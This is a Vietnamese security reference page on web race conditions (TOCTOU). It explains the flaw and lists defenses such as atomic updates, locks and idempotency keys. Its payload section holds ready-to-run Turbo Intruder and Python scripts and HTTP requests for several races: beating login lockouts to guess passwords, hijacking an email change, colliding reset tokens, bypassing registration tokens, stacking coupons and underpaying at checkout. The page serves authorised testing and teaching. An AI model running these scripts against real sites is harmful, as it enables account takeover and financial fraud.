# Race Conditions

> Các request đồng thời chen vào một khe thời gian để vượt giới hạn hoặc tiêu kép. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/race_condition.md`](../../../../Troubleshooting_Guide/race_condition.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** TOCTOU · A04:2021
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Một race condition phát sinh khi ứng dụng giả định rằng một chuỗi thao tác chạy nguyên tử (atomic),
nhưng các request đồng thời lại chen vào giữa chúng. Dạng kinh điển là lỗi TOCTOU (time-of-check to
time-of-use), trong đó khoảng cách giữa việc xác thực một trạng thái và việc hành động dựa trên nó trở
thành một khe có thể khai thác.

## Cơ chế hoạt động (How it works)
Kẻ tấn công kiểm soát thời điểm của request và gửi nhiều request song song để tất cả chúng rơi vào bên
trong khe giữa bước đọc/xác thực và bước ghi/commit. Vì ứng dụng kiểm tra một giới hạn, bộ đếm, hoặc số
dư tách biệt với việc cập nhật nó — mà không có khóa, giao dịch, hay thao tác nguyên tử — nên mỗi
request đồng thời đều đọc cùng một trạng thái trước-cập-nhật và được phê duyệt trước khi bất kỳ request
nào commit. Lỗi nằm ở việc thiếu đồng bộ hóa, chứ không nằm ở bất kỳ request đơn lẻ nào.

## Tác động (Impact)
Vượt qua các giới hạn của logic nghiệp vụ: dùng nhiều lần một coupon dùng-một-lần, rút hoặc chuyển nhiều
hơn số dư, đánh bại các bộ đếm chống brute-force, nhận các ưu đãi hàng giới hạn hoặc một-người-một-lần
lặp đi lặp lại, hoặc xung đột trên một tài nguyên dùng chung (ví dụ một token đặt lại mật khẩu bị tái
sử dụng). Mức độ nghiêm trọng dao động từ trung bình đến cao — thường là tổn thất tài chính hoặc vượt
xác thực — và phụ thuộc rất nhiều vào từng ứng dụng cụ thể.

## Cách phát hiện (How to detect)
- Các endpoint có kết quả phụ thuộc vào một bộ đếm, số dư, cờ, hoặc token dùng-một-lần được kiểm tra
  rồi biến đổi trong hai bước.
- Gửi cùng một request dưới dạng một loạt song song chặt chẽ (Burp "Send group in parallel", gate của
  Turbo Intruder) và quan sát xem hành động có thành công nhiều lần hơn mức giới hạn cho phép hay không.
- Kết quả không nhất quán qua các lần chạy, bản ghi trùng lặp, hoặc trạng thái cuối lệch-N là các dấu
  hiệu; tín hiệu mang tính phi tất định, nên hãy lặp lại loạt request nhiều lần.

## Khai thác (tóm tắt) (Exploitation)
Nhận diện một endpoint dạng kiểm-tra-rồi-hành-động, rồi bắn các request trùng lặp đồng thời (tấn công
single-packet qua HTTP/2, hoặc một kết nối đã được "làm nóng" để giảm thiểu jitter) để chúng xung đột
bên trong khe. Các biến thể đa bước đua hai endpoint khác nhau — ví dụ thêm một món hàng đắt tiền trong
khi checkout đang xác thực tổng tiền của món rẻ. Xem phần Payload để biết các kỹ thuật và công cụ cho
từng kịch bản.

## Payload & kỹ thuật (Payloads & techniques)

> Chắt lọc từ các tài liệu payload thực chiến — chỉ dành cho kiểm thử được cấp phép.

Động tác cốt lõi là bắn nhiều request **đồng thời** (song song), không phải tuần tự, để chúng rơi vào bên trong khe giữa bước **đọc/xác thực** và bước **ghi/thực thi**. Công cụ: Burp Repeater ("Send group in parallel"), Turbo Intruder (xếp hàng theo gate), hoặc Python với `asyncio`/`httpx`/`threading`.

### Tình huống → kỹ thuật (Situation → technique)

| Tình huống | Đích đua | Kỹ thuật |
|-----------|-------------|-----------|
| Khóa đăng nhập sau 3 lần thử | Tăng bộ đếm vs. kiểm tra thông tin xác thực | Bắn tất cả phỏng đoán trước khi bộ đếm tăng |
| Xác nhận thay đổi email | Trường email-đang-chờ vs. gửi xác nhận | Hai thay đổi song song, xác nhận định tuyến tới kẻ tấn công |
| Đặt lại mật khẩu | Timestamp tạo token | Đặt lại song song cho hai người dùng xung đột trên một token |
| Xác nhận email đăng ký | Khe token NULL | Đua `token[]=` mảng rỗng với token DB chưa được đặt |
| Coupon giảm giá dùng-một-lần | Xác thực vs. "đánh dấu đã dùng" | Nhiều lần áp dụng song song đều qua được xác thực |
| Tổng giỏ hàng / checkout | Nội dung giỏ vs. tính tổng | Tráo món hàng đắt trong khe checkout |

### Vượt giới hạn tốc độ (khóa đăng nhập) (Rate-limit bypass)

Gửi mọi mật khẩu ứng viên trong một loạt song song để tất cả qua được trước khi bộ đếm số lần thử tăng.

Turbo Intruder:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    passwords = wordlists.clipboard
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

Python (`httpx` async, HTTP/2):
```python
import asyncio, httpx, threading

TARGET_URL = "https://target/login"
USERNAME = "carlos"
CSRF_TOKEN = "TOKEN"

async def send_login(client, pwd, results, lock):
    try:
        r = await client.post(TARGET_URL, data={
            "csrf": CSRF_TOKEN, "username": USERNAME, "password": pwd
        })
        with lock:
            results.append({"pwd": pwd, "status": r.status_code})
    except: pass

async def race_attack(passwords):
    results, lock = [], threading.Lock()
    async with httpx.AsyncClient(http2=True, timeout=30.0, verify=False) as client:
        tasks = [send_login(client, p, results, lock) for p in passwords]
        await asyncio.gather(*tasks)
    return results

passwords = ["123456", "password", "qwerty", "12345678"]
print([r for r in asyncio.run(race_attack(passwords)) if r["status"] == 302])
```

### Đua thay đổi email (Email-change race)

Hai request thay đổi email song song mang hai địa chỉ khác nhau; email xác nhận cho địa chỉ nạn nhân có thể được gửi tới địa chỉ của kẻ tấn công.
```http
POST /my-account/change-email HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com
```
```http
POST /my-account/change-email HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

### Xung đột token đặt lại mật khẩu (Password-reset token collision)

Các request đặt lại song song cho hai người dùng (các session riêng biệt) có thể tạo ra các token giống hệt nhau qua một xung đột timestamp — dùng token của bạn cho username của nạn nhân.
```http
POST /forgot-password HTTP/2
Cookie: phpsessionid=SESSION1

username=wiener
```
```http
POST /forgot-password HTTP/2
Cookie: phpsessionid=SESSION2

username=carlos
```

### Vượt xác nhận đăng ký (đua token NULL) (Registration confirmation bypass)

Trong quá trình đăng ký, trường token bị NULL trong chốc lát. Đua một loạt xác nhận `token[]=` (mảng rỗng) với việc đăng ký sẽ khớp với giá trị DB chưa được đặt.
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2)

    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: target.com
Cookie: phpsessionid=SESSION_TOKEN
Content-Length: 0

'''
    for attempt in range(30):
        currentAttempt = str(attempt)
        username = 'User' + currentAttempt
        engine.queue(target.req, username, gate=currentAttempt)
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)
        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    table.add(req)
```
Payload then chốt: `POST /confirm?token[]= HTTP/2`.

### Áp dụng quá mức coupon dùng-một-lần (Single-use coupon over-application)

Nhân bản request coupon ~20 lần và gửi tất cả song song; mọi request đều qua được xác thực trước khi bất kỳ request nào đánh dấu coupon đã dùng, làm chồng mức giảm giá.
```http
POST /cart/coupon HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

coupon=PROMO20
```

### Đua giỏ hàng đa-endpoint (mua món đắt với giá rẻ) (Multi-endpoint cart race)

Với một món rẻ trong giỏ, đua một request thêm-món-đắt với checkout để checkout xác thực tổng tiền rẻ trong khi món đắt rơi vào bên trong khe.
```http
POST /cart HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

productId=EXPENSIVE_ITEM_ID&redir=PRODUCT&quantity=1
```
```http
POST /cart/checkout HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

csrf=YOUR_CSRF_TOKEN
```
Turbo Intruder (gate hai-endpoint):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            requestsPerConnection=100,
                            pipeline=False,
                            engine=Engine.BURP2)

    addItem = '''POST /cart HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

productId=EXPENSIVE_ITEM&redir=PRODUCT&quantity=1'''

    checkout = '''POST /cart/checkout HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

csrf=YOUR_CSRF'''

    for attempt in range(20):
        engine.queue(addItem, gate='race1')
        engine.queue(checkout, gate='race1')
        engine.openGate('race1')
        time.sleep(0.1)

def handleResponse(req, interesting):
    table.add(req)
```
Tương đương bằng Python với `threading`:
```python
import requests, threading, time

BASE_URL = "https://target"
SESSION = requests.Session()
SESSION.cookies.set("session", "YOUR_SESSION")

def add_expensive_item():
    SESSION.post(f"{BASE_URL}/cart", data={
        "productId": "1", "redir": "PRODUCT", "quantity": "1"})

def checkout():
    SESSION.post(f"{BASE_URL}/cart/checkout", data={"csrf": "YOUR_CSRF"})

for _ in range(30):
    t1 = threading.Thread(target=add_expensive_item)
    t2 = threading.Thread(target=checkout)
    t1.start(); t2.start(); t1.join(); t2.join()
    time.sleep(0.1)
```

### Làm nóng kết nối (Burp Repeater) (Connection warming)

Loại bỏ jitter mạng để các request đua rơi sát nhau:
```text
Tab 1: GET /                  (connection warmer — ignore response)
Tab 2: POST /cart             (add expensive item)
Tab 3: POST /cart/checkout    (checkout)

Select Tab 1–3 → "Send group in sequence (single connection)"
Then select Tab 2–3 → "Send group in parallel"
```

## Phòng chống (Defenses)
1. **Làm cho việc kiểm-tra-và-hành-động trở nên nguyên tử** — thực hiện xác thực và biến đổi trong một
   giao dịch cơ sở dữ liệu duy nhất với mức cô lập phù hợp, hoặc qua một thao tác nguyên tử
   (`UPDATE ... WHERE balance >= x`, compare-and-swap, `INCR`).
2. **Khóa tài nguyên đang tranh chấp** — khóa hàng/bản ghi (`SELECT ... FOR UPDATE`), mutex ứng dụng,
   hoặc khóa phân tán theo khóa người dùng/tài nguyên trong suốt thời gian của thao tác.
3. **Áp đặt tính duy nhất trong kho lưu trữ** — một ràng buộc duy nhất (ví dụ mỗi người dùng/coupon
   chỉ đổi một lần) cho phép cơ sở dữ liệu từ chối bản trùng lặp ngay cả khi có đồng thời.
4. **Khóa idempotency** cho các hành động nhạy cảm để các request phát lại/song song gộp lại thành một
   tác dụng duy nhất.
5. Tránh chia một thao tác logic đơn lẻ thành nhiều request/endpoint cùng chia sẻ trạng thái thay đổi
   được mà không có sự phối hợp.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=Race+Conditions
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Race+Conditions
- **Exploit-DB** — https://www.exploit-db.com/search?q=Race+Conditions
- **GitHub Advisories** — https://github.com/advisories?query=Race+Conditions
- **OSV** — https://osv.dev/list?q=Race+Conditions
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, X/Twitter infosec.
- _Mẹo tìm kiếm: thêm sản phẩm mục tiêu + phiên bản, ví dụ `Race Conditions <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- `CVE-2016-5195` — "Dirty COW": một race copy-on-write của kernel Linux cho phép leo thang đặc quyền cục bộ.
- `CVE-2019-11043` — Race PHP-FPM/Nginx (env_path_info underflow) dẫn đến thực thi mã từ xa.
- _Sự cố web kinh điển: nghiên cứu "limit overrun" của PortSwigger cho thấy các tấn công single-packet
  HTTP/2 đổi thẻ quà tặng và vượt giới hạn tốc độ trên nhiều site production._

## Tham khảo (References)
- PortSwigger Web Security Academy — Race conditions.
- OWASP — Testing for Race Conditions (WSTG-BUSL-08); Cheat Sheet on concurrency/locking.
- James Kettle, "Smashing the state machine: the true potential of web race conditions" (PortSwigger Research).
